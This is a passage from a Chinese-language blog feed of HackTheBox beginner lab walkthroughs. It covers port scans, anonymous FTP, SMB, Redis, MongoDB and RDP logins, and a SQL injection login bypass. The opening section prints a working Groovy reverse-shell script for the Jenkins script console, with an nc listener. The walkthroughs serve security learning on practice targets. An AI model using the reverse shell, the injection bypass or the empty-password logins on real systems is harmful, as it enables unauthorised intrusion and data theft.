class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">账号：root</span><br><span class=\"line\"></span><br><span class=\"line\">密码：password</span><br></pre></td></tr></table></figure>\n<p>成功登录后台</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212130740293.png\" alt=\"\"></p>\n<p>而在 Jenkins 的脚本控制台中，可以编写和运行 Groovy 脚本，我们就可以插入反弹 shell 的 Groovy 脚本</p>\n<p>路径：<span class=\"exturl\" data-url=\"aHR0cDovLzEwLjEyOS4xMDkuNDA6ODA4MC9zY3JpcHQ=\">http://10.129.109.40:8080/script</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String host=&quot;host_ip&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">int port=监听端口;</span><br><span class=\"line\"></span><br><span class=\"line\">String cmd=&quot;/bin/bash&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212132127116.png\" alt=\"\"></p>\n<p>本地监听 1234 端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lnvp 1234</span><br></pre></td></tr></table></figure>\n<p>点击 run 运行脚本成功获得 shell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212132407546.png\" alt=\"\"></p>\n<p>flag 在 root 目录下</p>\n<p><strong>总结：本台靶机主要考点在 Jenkins 的 script 目录下可以编写运行 Groovy 脚本，利用该功能编写脚本实现 shell 的反弹</strong></p>\n<h2 id=\"tactics\"><a class=\"markdownIt-Anchor\" href=\"#tactics\">#</a> Tactics</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212133219839.png\" alt=\"\"></p>\n<p>开放了 445 端口，使用 smbclient 列出 Administrator 用户下的共享文件（空密码）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient -L 10.129.172.139 -U Administrator</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212133926609.png\" alt=\"\"></p>\n<p>连接 C$ 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient \\\\\\\\10.129.172.139\\\\C$ -U Administrator</span><br></pre></td></tr></table></figure>\n<p>最终的 flag 在 Administrator 用户的 Desktop 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231212134313517.png\" alt=\"\"></p>\n<p>get 下来即可</p>\n<p><strong>总结：本台靶机的考点还是 445 端口的 smb 共享文件，Administrator 用户空密码</strong></p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/HTB%200%E5%B1%82/",
            "url": "https://nnnpc.github.io/2024/04/16/HTB%200%E5%B1%82/",
            "title": "HTB 0层",
            "date_published": "2024-04-16T05:58:18.999Z",
            "content_html": "<h1 id=\"htb-0层\"><a class=\"markdownIt-Anchor\" href=\"#htb-0层\">#</a> HTB 0 层</h1>\n<h2 id=\"meow\"><a class=\"markdownIt-Anchor\" href=\"#meow\">#</a> Meow</h2>\n<p>拿到目标 ip 先扫描一下开放端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -T4 -A -v -Pn 10.129.245.164</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129202422843.png\" alt=\"\"></p>\n<p>发现 23 端口开放了 telnet 远程登录服务</p>\n<p>使用 telnet 命令进行登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129202602937.png\" alt=\"\"></p>\n<p>并使用 root 用户进行免密登录</p>\n<p>登录成功后便能获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129202702595.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机考察的是 23 端口 telnet 服务的远程登录和 root 用户免密登录</strong></p>\n<h2 id=\"fawn\"><a class=\"markdownIt-Anchor\" href=\"#fawn\">#</a> Fawn</h2>\n<p>拿到 ip 使用 fscan 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129203056797.png\" alt=\"\"></p>\n<p>发现 21 端口存在 ftp 服务，并且 anonymous 用户下能找到 flag.txt</p>\n<p>跟着走</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls</span><br><span class=\"line\">get flag.txt</span><br><span class=\"line\">cat flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129203603713.png\" alt=\"\"></p>\n<p>免密登录 anonymous 并在目录下找到 flag.txt，使用 get 拉取到本地查看</p>\n<p><strong>总结：考察的点在 21 端口 FTP 服务 anonymous 用户免密登录和使用 get 将文件拉取到本地读取</strong></p>\n<h2 id=\"dancing\"><a class=\"markdownIt-Anchor\" href=\"#dancing\">#</a> Dancing</h2>\n<p>同样 fscan 进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129204251580.png\" alt=\"\"></p>\n<p>发现 445 端口是开放的，尝试 SMB 共享资源的访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient -L IP</span><br></pre></td></tr></table></figure>\n<p>无 password 直接回车</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129204822115.png\" alt=\"\"></p>\n<p>访问 WorkShares 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smbclient \\\\\\\\10.129.133.220\\\\WorkShares</span><br></pre></td></tr></table></figure>\n<p>在 James.P 中获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129205211107.png\" alt=\"\"></p>\n<p><strong>总结：本台靶机考点是 445 端口的 SMB 共享资源服务，通过 smbclient 命令能实现对远程靶机共享资源的访问</strong></p>\n<h2 id=\"redeemer\"><a class=\"markdownIt-Anchor\" href=\"#redeemer\">#</a> Redeemer</h2>\n<p>fscan 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129205912560.png\" alt=\"\"></p>\n<p>发现 6379 端口开放，再熟悉不过了，以为要拿 shell，于是先试了试写公钥，发现这台 redis 并不是 root 权限</p>\n<p>接着进行了主从复制，拿到 shell 之后也没发现任何东西</p>\n<p>但其实直接使用 redis-cli 命令连上 redis 就能 get flag 了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h IP</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129212246655.png\" alt=\"\"></p>\n<p><strong>总结：考察的是 redis-cli 命令的使用</strong></p>\n<h2 id=\"explosion\"><a class=\"markdownIt-Anchor\" href=\"#explosion\">#</a> Explosion</h2>\n<p>nmap 对目标 ip 的开放端口进行扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130173139725.png\" alt=\"\"></p>\n<p>可以看到目标 IP 的 3389 端口是开放的，可以进行 rdp 登录</p>\n<p>使用 kali 自带的命令 xfreerdp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xfreerdp /v: ip /u: administrator</span><br></pre></td></tr></table></figure>\n<p>空密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130173559309.png\" alt=\"\"></p>\n<p>成功连接并在桌面找到 flag</p>\n<p><strong>总结：考察的是 windows 靶机 3389 端口开放的 RDP，并使用 xfreerdp 命令 administrator 用户进行无密码连接</strong></p>\n<h2 id=\"preignition\"><a class=\"markdownIt-Anchor\" href=\"#preignition\">#</a> Preignition</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130174209458.png\" alt=\"\"></p>\n<p>fscan 扫描发现开放了 80 端口，既然有 web 服务那直接扫描一下目录</p>\n<p>方法一：</p>\n<p>dirsearch 扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./dirsearch.py -u 10.129.219.243</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130174725040.png\" alt=\"\"></p>\n<p>方法二：</p>\n<p>gobuster 扫描（kali 自带）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir --url http://10.129.219.243 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130174856854.png\" alt=\"\"></p>\n<p>发现了 /admin.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130174951003.png\" alt=\"\"></p>\n<p>访问使用弱口令 admin admin 登录后台获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130175029171.png\" alt=\"\"></p>\n<h2 id=\"mongod\"><a class=\"markdownIt-Anchor\" href=\"#mongod\">#</a> Mongod</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130175351105.png\" alt=\"\"></p>\n<p>扫描 IP 发现开放了 27017 端口，mongodb 数据库</p>\n<p>使用 mongo 命令进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongo --host 10.129.228.30:27017</span><br></pre></td></tr></table></figure>\n<p>因为这里是默认的用户名和空密码能直接连接成功</p>\n<p>完整的命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongo --username 用户名 --password --authenticationDatabase 用户授权可允许访问的数据库名 --host 远程mongod服务器的host/ip地址 --port 远程mongod服务端口</span><br></pre></td></tr></table></figure>\n<p>接下来查看数据库中的 flag 即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#列出所有数据库 show dbs </span><br><span class=\"line\"></span><br><span class=\"line\">#使用特定数据库 use DBName </span><br><span class=\"line\"></span><br><span class=\"line\">#列出所有表 show collections / show tables </span><br><span class=\"line\"></span><br><span class=\"line\">#展示集合中的数据 db.COLname.find().pretty()</span><br></pre></td></tr></table></figure>\n<p>本题 flag 在 sensitive_information 库中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130180329691.png\" alt=\"\"></p>\n<p><strong>总结：考察的是 27017 端口的 mongodb 数据库的连接以及字段的查询</strong></p>\n<h2 id=\"synced\"><a class=\"markdownIt-Anchor\" href=\"#synced\">#</a> Synced</h2>\n<p>nmap 扫描发现 873 端口开放了 rsync 服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130182105032.png\" alt=\"\"></p>\n<p>经过查询可以知道该服务可以实现主机同步，优点就是传输速度快</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rsync --list-only 10.129.198.104::\t\t\t\t#列出共享的文件</span><br><span class=\"line\"></span><br><span class=\"line\">rsync --list-only 10.129.198.104::public\t\t#访问共享的public文件夹</span><br><span class=\"line\"></span><br><span class=\"line\">rsync 10.129.198.104::public/flag.txt flag.txt\t#获取flag.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231130184700614.png\" alt=\"\"></p>\n<p><strong>总结：考点在 873 端口的 rsync，这是一个可以实现本地机子文件与远程机子文件快速同步的工具</strong></p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/HackTheBox%20%E7%AC%AC1%E5%B1%82/",
            "url": "https://nnnpc.github.io/2024/04/16/HackTheBox%20%E7%AC%AC1%E5%B1%82/",
            "title": "HackTheBox 第1层",
            "date_published": "2024-04-16T05:58:18.997Z",
            "content_html": "<h1 id=\"appointment\"><a class=\"markdownIt-Anchor\" href=\"#appointment\">#</a> Appointment</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/04WzV8FJfN1HLrp0.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Structured Query Language</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/es6li8JiD5t9xsQC.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：SQL injection</span><br></pre></td></tr></table></figure>\n<p>最常见的 sql 漏洞就是 sql 注入了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YmFSzglHkEIfxkql.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Personally Identifiable Information</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/a7KsOumX4ckbliHd.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：A03:2021-Injection</span><br></pre></td></tr></table></figure>\n<p>谷歌搜索一下得到<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9vd2FzcC5vcmcvVG9wMTAv\"> https://owasp.org/Top10/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c1lgxvOlXQbvBdYH.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lDjR9We2XwhuAIz2.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Apache httpd 2.4.38 ((Debian))</span><br></pre></td></tr></table></figure>\n<p>利用 nmap 扫描端口查看端口服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UOkZoIiabFzXJL6E.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Yxvnl3dPtRSnEf9W.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：443</span><br></pre></td></tr></table></figure>\n<p>https 默认的标准协议端口为 443</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：directory</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2ig2k1cMOnNazR4B.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：404</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b8PBmZyggJX5QKsG.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：dir</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rko7uxyEtVuW7j86.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：#</span><br></pre></td></tr></table></figure>\n<p>mysql 用来注释一行的是#</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VnUUQsdoyG34z1zG.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Congratulations</span><br></pre></td></tr></table></figure>\n<p>访问 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6y0zbBjtR3VbClQ5.png!thumbnail\" alt=\"\"></p>\n<p>简单的 sql 注入，使用’闭合前面的语句，并用 #注释后面的语句，用户名为真的情况下成功绕过密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin &#x27;#</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Yf8g6Jfk8AZ5ERf.png!thumbnail\" alt=\"\"></p>\n<p>这里就有需要的 flag 和 task 11 的答案</p>\n<h1 id=\"sequel\"><a class=\"markdownIt-Anchor\" href=\"#sequel\">#</a> Sequel</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ffRWeZA8hm45d7eK.png!thumbnail\" alt=\"\"></p>\n<p>询问哪个端口是为 mysql 服务开设的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/o56C23UrXCyvVOTa.png!thumbnail\" alt=\"\"></p>\n<p>nmap 扫描结果为 3306</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：3306</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V4qGGFzblVH7pMkD.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：MariaDB</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2YvbehziDQkAsXXH.png!thumbnail\" alt=\"\"></p>\n<p>-u 参数指定登陆用户名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-u</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dH0KaGLM6vgbHUvC.png!thumbnail\" alt=\"\"></p>\n<p>root 用户可以在不提供密码的情况下登录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：root</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/xJwMb2MM2EVYhcH5.png!thumbnail\" alt=\"\"></p>\n<p>查询所有内容的通配符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Tms5oUxJZYBHwIDz.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：htb</span><br></pre></td></tr></table></figure>\n<p>首先先连接上数据库<br>\n再通过语句查找所有数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uroot -h IP</span><br><span class=\"line\">show databases;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ux1LUgcEkS78AA7x.png!thumbnail\" alt=\"\"></p>\n<p>可以看到独有的数据库名称为 htb，接下来查找该数据库中的 flag 字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use htb;</span><br><span class=\"line\">show tables;</span><br><span class=\"line\">select * from config;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0WGjfe9WrzCy9iqB.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<h1 id=\"crocodile\"><a class=\"markdownIt-Anchor\" href=\"#crocodile\">#</a> Crocodile</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s5WaCijHsLL5wKEY.png!thumbnail\" alt=\"\"></p>\n<p>nmap 扫描的默认参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-sC</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZyXuGodhYVP8sLOg.png!thumbnail\" alt=\"\"></p>\n<p>使用 nmap 扫描端口</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RZgkcybJgx2TNlPU.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：vsftpd 3.0.3</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/StTYk79zcMiKwVis.png!thumbnail\" alt=\"\"></p>\n<p>匿名访问登录一下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HUMFIxtW5PCKjO0G.png!thumbnail\" alt=\"\"></p>\n<p>返回的码为 230</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：230</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UhXhtdNn1eNzEls3.png!thumbnail\" alt=\"\"></p>\n<p>匿名登陆使用的用户名也在上一问的截图当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：anonymous</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Xj9yXmQy94bfjMZ9.png!thumbnail\" alt=\"\"></p>\n<p>用 get 命令来下载 ftp 服务器上的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：get</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EadQGoi44RCG1P8F.png!thumbnail\" alt=\"\"></p>\n<p>用 get 命令下载文件 &quot;allowed.userlist&quot;</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rvJKNGQi4QqVaeNX.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QixMvGhLxJFcQKJq.png!thumbnail\" alt=\"\"></p>\n<p>权限最高的是 admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：admin</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2I9dDnSpnHcvKovx.png!thumbnail\" alt=\"\"></p>\n<p>询问 apache 的版本，在之前的 nmap 扫描截图中有显示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Apache httpd 2.4.41</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S7v7tslwuyEfd0Ne.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-x</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/J6zFJtsrGuWn559Y.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/h1CCkWBG3E6qic2e.png!thumbnail\" alt=\"\"></p>\n<p>我是使用 dirsearch 进行目录扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0QCXsIJg0KOkeDt8.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：login.php</span><br></pre></td></tr></table></figure>\n<p>访问登录页面</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wIqSK4s82b2X0w2N.png!thumbnail\" alt=\"\"></p>\n<p>使用之前匿名登陆时获取的 admin 的密码登录 admin 账户（密码存放在 allowed.userlist.pass 文件中，但是我这里没有成功 get）密码为：rKXM59ESxesUFHAd</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k0MFiuNpZ2JEnGeV.png!thumbnail\" alt=\"\"></p>\n<p>成功登录后台并获取到 flag</p>\n<h1 id=\"responder\"><a class=\"markdownIt-Anchor\" href=\"#responder\">#</a> Responder</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k2uCRb9IWXqC8EFZ.png!thumbnail\" alt=\"\"></p>\n<p>访问 web 